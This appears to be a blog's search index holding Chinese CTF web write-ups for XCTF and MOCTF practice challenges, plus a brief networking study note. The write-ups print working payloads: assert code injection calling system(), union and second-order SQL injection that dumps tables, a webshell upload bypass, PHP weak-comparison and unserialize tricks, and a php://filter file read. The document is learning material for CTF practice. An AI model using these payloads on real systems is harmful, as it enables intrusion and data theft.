<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[计算机网络复习]]></title>
    <url>%2F2019%2F06%2F15%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E8%84%91%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[水了一学期的计算机网络也该开始复习了，先把网络层和运输层复习了吧，其他后面再复习 网络层 运输层 下面是一些别人整理得比较好的脑图 互联网协议 TCP与HTTP]]></content>
      <categories>
        <category>课程</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>脑图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界部分web wp]]></title>
    <url>%2F2019%2F04%2F26%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86web-wp%2F</url>
    <content type="text"><![CDATA[参加强网杯的时候无意中看见这一个平台，想着也可以拿来练一下手，感觉还不错 Training-Get-Resourced签到题，右键查看源代码得到flag Training-WWW-Robots看题目，就应该是知道要查看robots.txt文件，发现有个/fl0g.php，得到flag NaNNaNNaNNaN-Batman下载附件，看了一下应该是js代码，用浏览器打开 查看元素只发现了这个 经队友提示在浏览器里面断点调试就可以恢复的代码 后来发现直接把web100里面的eval改成alert也可以直接得到代码 所以输入 be0f233ac7be98aa 就可以得到flag ics-06很奇怪的一道题，一开始进去是一个html首页，什么也点不了 后来用dirsearch扫了一遍网站发现还有个index.php，进去后发现一个报表中心，发现get传参id，但是也不能注入 后来看wp去了，要求是传参id=2333，？？？？这又是什么脑洞 lottery查看robots.txt发现存在/.git 泄露，可以使用GitHack工具获取源码 漏洞存在api.php里面 1234567891011121314function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; &#125; 其中numbers是用户购买的彩票号数，这里没有采用===而是使用==，存在php弱松散型比较,且从上面定义的函数看来win_number应该是一个字符串，只要利用弱松散类型转化为布尔类型就可以绕过这一验证 修改POST参数得到flag 1&#123;"action":"buy","numbers":['true','true','true','true','true','true','true']&#125; 下面附上php的松散型比较表格 TRUE FALSE 1 0 -1 “1” TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE FALSE TRUE FALSE TRUE FALSE FALSE “0” “-1” NULL array() “php” “” TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE upload上传漏洞，发现选择完php文件后立马就提示格式错误，判断是js本地判断，修改一句话木马为1.jpg，burp抓包改为1.php即可上传成功，也可以直接右键检查元素修改check()函数，同样也可以绕过，然后菜刀连接，成功拿到shell。 一开始打开flag文件发现什么都没有，后来试了另一个菜刀，发现是工具问题，遂解决 mfw习惯性用dirsearch扫了一遍，发现git泄露 index.php存在如下代码 123456789101112131415if (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125;else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!"); 这注释看着就有问题，发现assert函数，这个函数存在代码执行漏洞，strpos使用不当也会造成弱松散型漏洞，但是这里用的是===，所以没有这个问题。主要还是对assert进行攻击。尝试一下闭合语句。 payload如下 1/?page=123','..') === false and system('cat templates/flag.php') and strpos(' 发现什么也没有。。。后来用burp抓包在返回包发现了flag php2该网站存在敏感文件index.phps，可查看index.php的源码，查看发现如下代码 123456789101112131415&lt;?phpif("admin"===$_GET[id]) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "admin")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;Key: xxxxxxx &lt;/p&gt;";&#125;?&gt;Can you anthenticate to this website? 对admin进行二次编码，这样第一次接收到的id是admin进行一次编码得到的数据，再经过解码就可以得到admin unserialize3打开页面发现如下 123456class xctf&#123; public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= 结合题目可知是反序列漏洞，之前也一直没有去接触这种类型的漏洞，也没有接触过类，正好学习一下 这个题目考察的是__wakeup的漏洞，只要让传入的序列有问题，就不会继续进入执行exit了，得到flag，payload如下,只要报错就要可以了，有多种答案 1?code=O:4:"xctf":2:&#123;s:4:"flag";s:3:"111";&#125; 一开始对序列化后的格式一直看不懂，后来找到了这篇博客,讲的很详细 FlatScience老规矩dirsearch跑一遍，结果发现了login.php，找了一边发现login源码有提示 1&lt;!-- TODO: Remove ?debug-Parameter! --&gt; 后来查了一下发现传参debug可以获得login源码 123456789101112131415161718192021222324252627&lt;?php if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo "&lt;br&gt;Some Error occourred!"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header("Location: /"); die(); &#125; &#125; if(isset($_GET['debug'])) highlight_file('login.php'); ?&gt; &lt;!-- TODO: Remove ?debug-Parameter! --&gt; 简单看了一下，发现直接带入数据库查询了，没有进行过滤，如果查询到的话会以cookie形式返回查询结果，经测试发现第二位存在注入点，但是没有database()，查了才知道sqlite自带的结构表是sqlist_master,考虑如下paylaod 1usr=' union select name,sql from sqlite_master--+&amp;pw= sql是sqlite_master中的一个字段你，保存的是建表时的语句既然返回的是第二位，那就令第一位为name，第二位为sql，这样就可以得到以下结果 1CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255)) 这样就知道有个Users表中有四个字段了，利用limit偏移查询 1234usr=' union select name,id from Users limit 0,1--+&amp;pw=usr=' union select name,name from Users limit 0,1--+&amp;pw=usr=' union select name,password from Users limit 0,1--+&amp;pw=usr=' union select name,hint from Users limit 0,1--+&amp;pw= 得到 id name password hint 1 admin 3fab54a50e770d830c0416df817567662a9dc85c my+fav+word+in+my+fav+paper%3F%21 2 fritze 54eae8935c90f467427f05e4ece82cf569f89507 my+love+is%E2%80%A6%3 3 hansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd the+password+is+password 所以这里就是要去他的论文里查找一个单词加上Salz!后加密等于上表哈希值的单词了，先贴个大佬的代码 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlibdef get_pdf(): return [i for i in os.listdir("./") if i.endswith("pdf")]def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return textdef find_password(): pdf_path = get_pdf() for i in pdf_path: print "Searching word in " + i pdf_text = convert_pdf_2_text(i).split(" ") for word in pdf_text: sha1_password = hashlib.sha1(word+"Salz!").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print "Find the password :" + word exit()if __name__ == "__main__": find_password() 得到密码后登陆得到flag NewsCenter打开后发现有地方可以注入，测试发现有三个点，其中有两个是可以注入得 先爆数据库名 发现没办法用select schema_name from information_schema.schemata爆数据库名，只好看看现在这个数据库的表 1hello' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 # 得到news,secret_table,看起来flag多半在secret_table这个表里了，接下来爆列名 1hello' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="secret_table"),3 # 得到id,fl4g,继续爆数据 flag有了 upload这题看上去是一道上传题，但是实际上确实一道二次注入的题，上传一个普通文件会发现文件名会回显在页面上，因此可以对这个进行尝试 尝试了#，–+都不能有回显的数据，再尝试对输入进行闭合 1'+(select 1)+' 发现select被过滤了，测试了一下from也被过滤了，除此之外还会检测一些敏感函数例如ascii和mid，但是conv，hex，substr还在。还有就是当 后来经过尝试发现select只过滤了一次，而名字太长转换成数字会表现为科学记数法方式,所以可以构造以下payload 爆数据库名1'+conv(hex(substr((sselectelect database()),9,4)),16,10)+'.jpg 爆表名1'+conv(hex(substr((sselectelect table_name frfromom information_schema.tables where table_schema=database() limit 0,1),1,4)),16,10)+'.jpg 得到两个表files和hello_flag_is_here 爆字段1'+conv(hex(substr((sselectelect column_name frfromom information_schema.columns where table_name='hello_flag_is_here' limit 0,1),1,4)),16,10)+'.jpg 得到一个字段 i_am_flag 爆内容1'+conv(hex(substr((sselectelect i_am_flag frfromom hello_flag_is_here limit 0,1),1,4)),16,10)+'.jpg 得到flag PS： 由于之前完全没有深入接触过sql，所以在这一道题上面花费了很多时间，可以说就是一个学习sql的过程，也遇到很多坑，比如嵌套select语句的时候必须将里面的sql语句用()括起来，还有就是字符串相加会等于0，所以在上面的这道题目中才需要使用hex函数将字符串转化为十六进制数，而十六进制数在这里也是字符串，在select语句里面只有前缀为0x才会认定为十六进制数，否则字符串加起来都是0，所以必须的用conv函数将得到的十六进制数转化为10进制，再将其传达出来。此外还遇到一个有意思的事情，就是如果字符串是数字开头，那么字符串和数字进行运算的值就是开头的数字。]]></content>
      <categories>
        <category>CTF</category>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MOCTF-WriteUp]]></title>
    <url>%2F2018%2F11%2F28%2FMOCTF-WriteUp%2F</url>
    <content type="text"><![CDATA[初次玩CTF，听说自己学校有平台，就来玩一下 一道水题题如其名，查看源代码就可以看到flag 还是水题 尝试输入，发现输入失败，于是F12直接修改数据 直接删除disabled，修改长度为5 访问限制 很简单，使用tamper data修改firefox为NAIVE就可访问flag 机器蛇 直接进入源代码，发现下面有个提示，进入robots.txt文件查看 访问flagxxxxxxxxxxxxxx.php的那个页面即可获得flag php黑魔法题目提示php，访问index.php 发现源代码 考察的是弱类型，md5无法加密数组，都返回false，因此构造?a=[]=1&amp;b[]=2，得到flag 我想要钱 阅读源代码可知要输入一个money，使其长度小于4，又要大于时间数（非常大），还不能是数组，于是就想到用科学计数法输入5e10，得到flag 登陆就对了 题目提示是一道sql注入题目，输入万能密码 ‘or ‘1’ = ‘1’ # 文件包含右键查看源代码发现提示说有flag.php，于是想着直接输入以下url访问 1http://119.23.73.3:5001/web8/index.php?file=flag.php 但是发现什么也没有，百思不得其解，后来看了大佬的wp才知道要用 php://filter函数 才能把文件经过base64解密传回来，还是经历的太少了,附上参数表 于是乎构造payload： 1?file=php://filter/convert.base64-encode/resource=flag.php 回显一段base64加密的字符串，解密就可以看到被 // 注释掉的flag 暴跳老板拿到题目一时懵逼，不知道怎么处理，后来用burp在返回包里发现了这个 于是乎通过post传 1postText=&amp;Dear=MyBoss 得到flag flag在哪？点击页面上的getflag后直接跳转到there is no flag，怀疑是302跳转于是抓包果不其然,发现五个页面 12345where_is_flag.phpflag.phpI_have_a_frog.phpI_have_a_flag.phpno_flag.php 找了好几遍还是没有找到，当时做的时候也没有提示，无奈之下只好找wp发现原来题目有两个hint Hint1: 跟一首歌有关。 Hint2: PPAP 访问抓包flagfrog.php，得到flag 美味的饼干先任意用户登陆一下查看cookie发现这个 1ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D %3D应该是=了，怀疑是base64加密，解密了一下得到 1ee11cbb19052e40b07aac0ca060c23ee 一开始以为是字符串转16进制，后来发现不对，应该是md5加密，解密后得到”user” 根据提示admin才能得到flag，对”admin”进行同样的加密，替换cookie，查看源码得到flag 没时间解释了发现标题只有index2.php，试了index1.php不行，应该是index.php了，结果index.php被跳转了 抓包发现还有个 uploadsomething.php ，上传一句话结果发现被转换成Too slow! 用burp的Intruder同时请求,得到flag 另外不知道为什么在sublime上用python跑不出来，可能是我还不太会用 火眼金睛看题目的意思应该就是数出moctf的数量然后post传参，放上脚本 12345678import requestsurl = 'http://119.23.73.3:5001/web10/'s=requests.Session()res=s.get(url)num = res.text.count("moctf")-1 #因为题目里还有一个moctf所以要减一url = 'http://119.23.73.3:5001/web10/work.php'print(s.post(url,data=&#123;"answer":num&#125;).text) 这里好像要用session才能让答案被识别，否则会一直显示答案错误]]></content>
      <categories>
        <category>CTF</category>
        <category>MOCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>MOCTF</tag>
      </tags>
  </entry>
</search>
